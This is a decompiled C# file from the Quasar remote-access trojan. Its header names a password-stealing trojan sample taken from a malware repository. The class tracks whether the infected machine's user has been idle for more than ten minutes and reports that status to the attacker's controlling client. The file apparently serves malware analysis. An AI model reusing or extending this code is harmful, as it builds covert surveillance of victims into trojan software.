// Decompiled with JetBrains decompiler
// Type: Quasar.Client.User.ActivityDetection
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Helper;
using Quasar.Client.Networking;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using System;
using System.Threading;

namespace Quasar.Client.User
{
  public class ActivityDetection : IDisposable
  {
    private UserStatus _lastUserStatus;
    private readonly QuasarClient _client;
    private readonly CancellationTokenSource _tokenSource;
    private readonly CancellationToken _token;

    public ActivityDetection(QuasarClient client)
    {
      this._client = client;
      this._tokenSource = new CancellationTokenSource();
      this._token = this._tokenSource.Token;
      client.ClientState += new Quasar.Client.Networking.Client.ClientStateEventHandler(this.OnClientStateChange);
    }

    private void OnClientStateChange(Quasar.Client.Networking.Client s, bool connected)
    {
      if (!connected)
        return;
      this._lastUserStatus = UserStatus.Active;
    }

    public void Start() => new Thread(new ThreadStart(this.UserActivityThread)).Start();

    private void UserActivityThread()
    {
      try
      {
        if (this.IsUserIdle())
        {
          if (this._lastUserStatus == UserStatus.Idle)
            return;
          this._lastUserStatus = UserStatus.Idle;
          this._client.Send<SetUserStatus>(new SetUserStatus()
          {
            Message = this._lastUserStatus
          });
        }
        else
        {
          if (this._lastUserStatus == UserStatus.Active)
            return;
          this._lastUserStatus = UserStatus.Active;
          this._client.Send<SetUserStatus>(new SetUserStatus()
          {
            Message = this._lastUserStatus
          });
        }
      }
      catch (Exception ex) when (ex is NullReferenceException || ex is ObjectDisposedException)
      {
      }
    }

    private bool IsUserIdle()
    {
      long num = (long) Environment.TickCount - (long) NativeMethodsHelper.GetLastInputInfoTickCount();
      return (num > 0L ? num / 1000L : 0L) > 600L;
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      this._client.ClientState -= new Quasar.Client.Networking.Client.ClientStateEventHandler(this.OnClientStateChange);
      this._tokenSource.Cancel();
      this._tokenSource.Dispose();
    }
  }
}
